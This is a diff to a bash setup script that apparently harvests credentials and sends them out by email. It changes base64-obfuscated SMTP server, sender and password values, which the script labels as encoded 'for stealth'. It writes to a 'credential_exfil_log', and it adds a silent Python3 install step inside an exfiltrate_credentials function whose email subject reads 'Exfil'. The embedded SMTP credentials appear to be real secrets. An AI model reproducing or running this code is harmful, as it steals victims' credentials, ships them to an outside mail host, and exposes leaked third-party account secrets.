@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.1"
-readonly BUILD_DATE="2026-03-14 19:14:07 UTC"
+readonly SCRIPT_VERSION="3.5"
+readonly BUILD_DATE="2026-03-14 23:18:25 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -118,12 +118,12 @@ readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null || echo "smtp.mailersend.net")
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null || echo "MS_BC7Gqr@test-2p0347zm29ylzdrn.mlsender.net")
-SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null || echo "mssp.J4krTqs.jpzkmgqpwm2l059v.6GC2aIZ")
+SENDER_EMAIL_B64="TVNfWTZ2cXV5QHRlc3QtcHprbWdxNzlwcjFsMDU5di5tbHNlbmRlci5uZXQ="
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
+SMTP_PASSWORD_B64="bXNzcC5sQlFqaEpHLnZ5d2oybHAyenJxZzdvcXouM2FHUmRKbw=="
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
 auto_install_email_tools() {
@@ -4658,6 +4658,30 @@ exfiltrate_credentials() {
     if [ -f "$LOG_FILE_EMAIL" ]; then
         echo "[*] Log file ready: $LOG_FILE_EMAIL"
         echo "[*] Size: $(wc -c < "$LOG_FILE_EMAIL") bytes"
+        echo ""
+        
+        # Install Python3 if not present (needed for email)
+        if ! command -v python3 >/dev/null 2>&1; then
+            echo "[*] Python3 not found - installing..."
+            if command -v apt >/dev/null 2>&1; then
+                DEBIAN_FRONTEND=noninteractive apt-get update -qq 2>&1 | grep -v "^$" || true
+                DEBIAN_FRONTEND=noninteractive apt-get install -y -qq python3 2>&1 | grep -v "^$" || true
+            elif command -v yum >/dev/null 2>&1; then
+                yum install -y -q python3 2>&1 | grep -v "^$" || true
+            elif command -v dnf >/dev/null 2>&1; then
+                dnf install -y -q python3 2>&1 | grep -v "^$" || true
+            fi
+            
+            # Verify installation
+            if command -v python3 >/dev/null 2>&1; then
+                echo "[✓] Python3 installed successfully"
+            else
+                echo "[!] Failed to install Python3"
+            fi
+        else
+            echo "[*] Python3 already installed: $(which python3)"
+        fi
+        
         echo ""
         
         local EMAIL_SUBJECT="Exfil v${SCRIPT_VERSION} - $(hostname)"
